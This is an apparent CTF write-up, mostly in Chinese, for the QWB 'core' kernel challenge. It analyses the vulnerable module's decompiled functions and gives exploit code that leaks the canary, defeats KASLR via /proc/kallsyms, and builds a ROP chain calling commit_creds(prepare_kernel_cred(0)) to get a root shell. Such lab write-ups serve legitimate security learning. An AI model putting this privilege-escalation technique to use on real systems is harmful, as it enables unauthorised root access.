## Analysis

### init

```sh
#!/bin/sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs none /dev
/sbin/mdev -s
mkdir -p /dev/pts
mount -vt devpts -o gid=4,mode=620 none /dev/pts
chmod 666 /dev/ptmx
cat /proc/kallsyms > /tmp/kallsyms	# copy /proc/kallsyms表
echo 1 > /proc/sys/kernel/kptr_restrict	# 无法查看/proc/kallsyms
echo 1 > /proc/sys/kernel/dmesg_restrict	# 无法查看dmesg
ifconfig eth0 up
udhcpc -i eth0
ifconfig eth0 10.0.2.15 netmask 255.255.255.0
route add default gw 10.0.2.2 
insmod /core.ko

poweroff -d 120 -f &	# 把这行关了避免关机
setsid /bin/cttyhack setuidgid 1000 /bin/sh
echo 'sh end!\n'
umount /proc
umount /sys

poweroff -d 0  -f
```

### core.ko

**Core_ioctl**

```c
// 设置三个接口
__int64 __fastcall core_ioctl(__int64 a1, int a2, __int64 a3)
{
  switch ( a2 )
  {
    case 0x6677889B:
      core_read(a3);	// 读值到a3地址
      break;
    case 0x6677889C:
      printk("\x016core: %d\n", a3);
      off = a3;
      break;
    case 0x6677889A:
      printk("\x016core: called core_copy\n");
      core_copy_func(a3);
      break;
  }
  return 0LL;
}
```

**Core_read**

```c
void __fastcall core_read(__int64 a1)
{
  __int64 v1; // rbx
  char *v2; // rdi
  signed __int64 i; // rcx
  char v4[64]; // [rsp+0h] [rbp-50h]
  unsigned __int64 v5; // [rsp+40h] [rbp-10h]

  v1 = a1;
  v5 = __readgsqword(0x28u);
  printk("\x016core: called core_read\n");
  printk("\x016%d %p\n", off, (const void *)a1);	// 输出off值和a1地址
  v2 = v4;
  for ( i = 16LL; i; --i )	// 清空v4的地址内容，大小为16*4=0x40
  {
    *(_DWORD *)v2 = 0;
    v2 += 4;
  }
  strcpy(v4, "Welcome to the QWB CTF challenge.\n");
  if ( copy_to_user(v1, &v4[off], 64LL) )	// 从v4 copy64字节到v1，但实际上可以控制off
    __asm { swapgs }
}
```

**Core_copy_func**

```c
void __fastcall core_copy_func(signed __int64 a1)
{
  char v1[64]; // [rsp+0h] [rbp-50h]
  unsigned __int64 v2; // [rsp+40h] [rbp-10h]

  v2 = __readgsqword(0x28u);
  printk("\x016core: called core_writen");
  if ( a1 > 63 )
    printk("\x016Detect Overflow");
  else
    qmemcpy(v1, name, (unsigned __int16)a1);    // overflow
}
```

**Core_write**

```c
signed __int64 __fastcall core_write(__int64 a1, __int64 a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // rbx
  v3 = a3;
  printk("\x016core: called core_writen");
  if ( v3 <= 0x800 && !copy_from_user(name, a2, v3) )
    return (unsigned int)v3;
  printk("\x016core: error copying data from userspacen");
  return 0xFFFFFFF2LL;
}
```

---

## Solution

>Save States

首先要保存用户态的寄存器，为了在jump回来的时候可以着陆到用户态。

```c
size_t user_cs, user_ss, user_rflags, user_sp;
void save_status(void)
{
    asm volatile (
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
    );
    puts("\033[34m\033[1m[*] Status has been saved.\033[0m");
}
```

> Get the KASLR

通过/proc/kallsyms可以得到Kernel的符号表静态地址，然后根据偏移就可以得到offset。

```c
while(fscanf(ksyms_file, "%lx%s%s", &addr, type, buf)) {
    if(prepare_kernel_cred && commit_creds) {
        break;
    }

    if(!commit_creds && !strcmp(buf, "commit_creds")) {
        commit_creds = addr;
        printf(
            SUCCESS_MSG("[+] Successful to get the addr of commit_cread: ")   
           "%lx\n", commit_creds);
        continue;
    }

    if(!strcmp(buf, "prepare_kernel_cred")) {
        prepare_kernel_cred = addr;
        printf(SUCCESS_MSG(
            "[+] Successful to get the addr of prepare_kernel_cred: ")
           "%lx\n", prepare_kernel_cred);
        continue;
    }
}
kernel_offset = commit_creds - COMMIT_CREDS;
kernel_base += kernel_offset;
```

> Get the canary

通过offset的设置得到canary的内容。

```c
set_off_val(fd, 64);
core_read(fd, buf);
canary = ((size_t*) buf)[0];
```

> Construct the ROP Chain

这一部分主要分为三个步骤，第一个是绕过canary，第二个是调用`commit_creds(prepare_kernel_cred(0))`，

第三个是着陆回用户态。

```c
for(i = 0; i < 10; i++)	rop_chain[i] = canary;
rop_chain[i++] = POP_RDI_RET + kernel_offset;
rop_chain[i++] = 0;
rop_chain[i++] = prepare_kernel_cred;
rop_chain[i++] = POP_RDX_RET + kernel_offset;   // exec:1
rop_chain[i++] = POP_RCX_RET + kernel_offset;   // exec:3
rop_chain[i++] = MOV_RDI_RAX_CALL_RDX + kernel_offset;  // exec:2
rop_chain[i++] = commit_creds;
rop_chain[i++] = SWAPGS_POPFQ_RET + kernel_offset;
rop_chain[i++] = 0;
rop_chain[i++] = IRETQ + kernel_offset;
rop_chain[i++] = (size_t) get_root_shell;
rop_chain[i++] = user_cs;
rop_chain[i++] = user_rflags;
rop_chain[i++] = user_sp + 8;   // userland stack balance
rop_chain[i++] = user_ss;

/* exploitation */

log_info("[*] Start to execute ROP chain in kernel space...");

write(fd, rop_chain, 0x800);
core_copy(fd, 0xffffffffffff0000 | (0x100));
```

---



















